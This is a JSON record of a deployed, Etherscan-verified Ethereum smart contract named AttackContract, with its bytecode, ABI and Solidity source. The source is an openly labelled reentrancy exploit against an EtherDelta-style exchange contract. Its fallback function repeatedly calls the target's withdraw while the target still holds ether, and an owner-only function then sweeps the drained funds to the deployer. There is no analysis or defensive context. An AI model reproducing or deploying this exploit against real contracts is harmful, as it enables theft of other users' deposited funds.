{
    "address": "0x5Ea8C15176877338227B79CBc9d14Ed71F0E9250",
    "tx_hash": "0019df132d81bdb58a3b4f31f4e9bdc37653e96e919715cc9ffae10443471ef0",
    "block_number": 18001862,
    "timestamp": 1693089335,
    "gas_used_in_creation": 554664,
    "creation_bytecode": "608060405234801561001057600080fd5b50604051610983380380610983833981810160405281019061003291906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610140565b6000815190506100c881610129565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b600061010282610109565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610132816100f7565b811461013d57600080fd5b50565b6108348061014f6000396000f3fe6080604052600436106100595760003560e01c806324600fc31461012c57806364bf5dcb1461014357806364dd891a1461014d5780638da5cb5b14610176578063d0e30db0146101a1578063d4b83992146101ab57610060565b3661006057005b3460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061012a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016100f7919061075b565b600060405180830381600087803b15801561011157600080fd5b505af1158015610125573d6000803e3d6000fd5b505050505b005b34801561013857600080fd5b506101416101d6565b005b61014b6102d1565b005b34801561015957600080fd5b50610174600480360381019061016f9190610563565b610354565b005b34801561018257600080fd5b5061018b610472565b60405161019891906106c5565b60405180910390f35b6101a9610498565b005b3480156101b757600080fd5b506101c061052a565b6040516101cd91906106e0565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610266576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161025d906106fb565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102ce573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561033957600080fd5b505af115801561034d573d6000803e3d6000fd5b5050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103db9061073b565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040161043d919061075b565b600060405180830381600087803b15801561045757600080fd5b505af115801561046b573d6000803e3d6000fd5b5050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610528576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161051f9061071b565b60405180910390fd5b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008135905061055d816107e7565b92915050565b60006020828403121561057557600080fd5b60006105838482850161054e565b91505092915050565b61059581610787565b82525050565b6105a4816107c3565b82525050565b60006105b7602183610776565b91507f4f6e6c7920746865206f776e65722063616e2077697468647261772066756e6460008301527f73000000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061061d602083610776565b91507f4f6e6c7920746865206f776e65722063616e206465706f7369742066756e64736000830152602082019050919050565b600061065d602683610776565b91507f4f6e6c7920746865206f776e65722063616e20696e697469617465207468652060008301527f61747461636b00000000000000000000000000000000000000000000000000006020830152604082019050919050565b6106bf816107b9565b82525050565b60006020820190506106da600083018461058c565b92915050565b60006020820190506106f5600083018461059b565b92915050565b60006020820190508181036000830152610714816105aa565b9050919050565b6000602082019050818103600083015261073481610610565b9050919050565b6000602082019050818103600083015261075481610650565b9050919050565b600060208201905061077060008301846106b6565b92915050565b600082825260208201905092915050565b600061079282610799565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006107ce826107d5565b9050919050565b60006107e082610799565b9050919050565b6107f0816107b9565b81146107fb57600080fd5b5056fea26469706673582212208f1a93100637deb4b1cb4a4cc785638523f4d8eb75373cfea99cbd081d43dca964736f6c634300080000330000000000000000000000004aea7cf559f67cedcad07e12ae6bc00f07e8cf65",
    "runtime_bytecode": "6080604052600436106100595760003560e01c806324600fc31461012c57806364bf5dcb1461014357806364dd891a1461014d5780638da5cb5b14610176578063d0e30db0146101a1578063d4b83992146101ab57610060565b3661006057005b3460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061012a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016100f7919061075b565b600060405180830381600087803b15801561011157600080fd5b505af1158015610125573d6000803e3d6000fd5b505050505b005b34801561013857600080fd5b506101416101d6565b005b61014b6102d1565b005b34801561015957600080fd5b50610174600480360381019061016f9190610563565b610354565b005b34801561018257600080fd5b5061018b610472565b60405161019891906106c5565b60405180910390f35b6101a9610498565b005b3480156101b757600080fd5b506101c061052a565b6040516101cd91906106e0565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610266576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161025d906106fb565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102ce573d6000803e3d6000fd5b50565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561033957600080fd5b505af115801561034d573d6000803e3d6000fd5b5050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103db9061073b565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040161043d919061075b565b600060405180830381600087803b15801561045757600080fd5b505af115801561046b573d6000803e3d6000fd5b5050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610528576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161051f9061071b565b60405180910390fd5b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008135905061055d816107e7565b92915050565b60006020828403121561057557600080fd5b60006105838482850161054e565b91505092915050565b61059581610787565b82525050565b6105a4816107c3565b82525050565b60006105b7602183610776565b91507f4f6e6c7920746865206f776e65722063616e2077697468647261772066756e6460008301527f73000000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061061d602083610776565b91507f4f6e6c7920746865206f776e65722063616e206465706f7369742066756e64736000830152602082019050919050565b600061065d602683610776565b91507f4f6e6c7920746865206f776e65722063616e20696e697469617465207468652060008301527f61747461636b00000000000000000000000000000000000000000000000000006020830152604082019050919050565b6106bf816107b9565b82525050565b60006020820190506106da600083018461058c565b92915050565b60006020820190506106f5600083018461059b565b92915050565b60006020820190508181036000830152610714816105aa565b9050919050565b6000602082019050818103600083015261073481610610565b9050919050565b6000602082019050818103600083015261075481610650565b9050919050565b600060208201905061077060008301846106b6565b92915050565b600082825260208201905092915050565b600061079282610799565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006107ce826107d5565b9050919050565b60006107e082610799565b9050919050565b6107f0816107b9565b81146107fb57600080fd5b5056fea26469706673582212208f1a93100637deb4b1cb4a4cc785638523f4d8eb75373cfea99cbd081d43dca964736f6c63430008000033",
    "contract_name": "AttackContract",
    "compiler_version": "v0.8.0+commit.c7dfd78e",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositToTarget\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IEtherDelta\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IEtherDelta {\r\n    function deposit() external payable;\r\n    function withdraw(uint amount) external;\r\n    function balanceOf(address token, address user) external view returns (uint);\r\n}\r\n\r\ncontract AttackContract {\r\n    IEtherDelta public target;\r\n    address public owner;\r\n\r\n    constructor(address _target) {\r\n        target = IEtherDelta(_target);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Function to deposit ETH to this contract by the owner\r\n    function deposit() external payable {\r\n        require(msg.sender == owner, \"Only the owner can deposit funds\");\r\n    }\r\n\r\n    // Deposit ETH to the target (EtherDelta)\r\n    function depositToTarget() external payable {\r\n        target.deposit{value: msg.value}();\r\n    }\r\n\r\n    // Trigger the reentrancy attack\r\n    function attack(uint amount) external {\r\n        require(msg.sender == owner, \"Only the owner can initiate the attack\");\r\n        target.withdraw(amount);\r\n    }\r\n\r\n    // Receive ether function for the fallback mechanism\r\n    receive() external payable {}\r\n\r\n    // Reentrancy attack\r\n    fallback() external payable {\r\n        if (address(target).balance >= msg.value) {\r\n            target.withdraw(msg.value);\r\n        }\r\n    }\r\n\r\n    // Allow the owner to withdraw funds after the attack\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only the owner can withdraw funds\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n}",
    "etherscan_verified": true
}